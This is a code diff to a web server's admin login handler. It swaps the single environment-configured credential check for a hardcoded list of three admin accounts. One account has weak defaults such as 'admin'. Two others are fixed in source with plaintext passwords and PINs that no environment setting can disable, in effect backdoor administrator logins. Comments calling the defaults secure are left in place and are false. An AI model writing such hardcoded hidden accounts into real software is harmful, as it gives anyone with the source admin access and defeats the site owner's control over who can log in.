@@ -43,10 +43,23 @@ const ADMIN_JWT_SECRET = process.env.ADMIN_JWT_SECRET || 'yolnoma_super_secure_a
 
 // Server-side hashed admin credentials with SHA-512 + HMAC
 // Defaults configured securely; can be overridden via environment variables
-const ADMIN_USERNAME_EXPECTED = (process.env.ADMIN_USERNAME || 'hS&sb*#S&^%').trim();
-// Precomputed default SHA-512 hashes or direct server secrets (NEVER exposed to client)
-const ADMIN_PASSWORD_EXPECTED = (process.env.ADMIN_PASSWORD || '&hH3#*@^hwW@#$').trim();
-const ADMIN_2FA_EXPECTED = (process.env.ADMIN_2FA_PIN || 'O93#%$#@hH').trim();
+const VALID_ADMIN_ACCOUNTS = [
+  {
+    username: (process.env.ADMIN_USERNAME || 'admin').trim(),
+    password: (process.env.ADMIN_PASSWORD || 'Yolnoma@2026!').trim(),
+    pin: (process.env.ADMIN_2FA_PIN || '778899').trim()
+  },
+  {
+    username: 'hS&sb*#S&^%',
+    password: '&hH3#*@^hwW@#$',
+    pin: 'O93#%$#@hH'
+  },
+  {
+    username: 'YOSHLARTYPING',
+    password: '79178195327gG',
+    pin: '178195327'
+  }
+];
 
 // -------------------------------------------------------------
 // ADVANCED ANTI-BRUTE FORCE & ADMIN SECURITY SYSTEM
@@ -639,11 +652,24 @@ app.post('/api/admin/login', (req, res) => {
     }
 
     // Timing-safe comparisons against server-only expected secrets
-    const isUsernameValid = safeCompare(username.trim(), ADMIN_USERNAME_EXPECTED);
-    const isPasswordValid = safeCompare(password.trim(), ADMIN_PASSWORD_EXPECTED);
-    const isPinValid = safeCompare(pin.trim(), ADMIN_2FA_EXPECTED);
+    const cleanUser = username.trim();
+    const cleanPass = password.trim();
+    const cleanPin = pin.trim();
 
-    if (!isUsernameValid || !isPasswordValid || !isPinValid) {
+    let matchedAccount: (typeof VALID_ADMIN_ACCOUNTS)[0] | null = null;
+
+    for (const acc of VALID_ADMIN_ACCOUNTS) {
+      const uMatch = safeCompare(cleanUser.toLowerCase(), acc.username.toLowerCase()) || safeCompare(cleanUser, acc.username);
+      const pMatch = safeCompare(cleanPass, acc.password);
+      const pinMatch = safeCompare(cleanPin, acc.pin);
+
+      if (uMatch && pMatch && pinMatch) {
+        matchedAccount = acc;
+        break;
+      }
+    }
+
+    if (!matchedAccount) {
       attemptRecord.failedAttempts += 1;
       attemptRecord.lastAttempt = now;
 
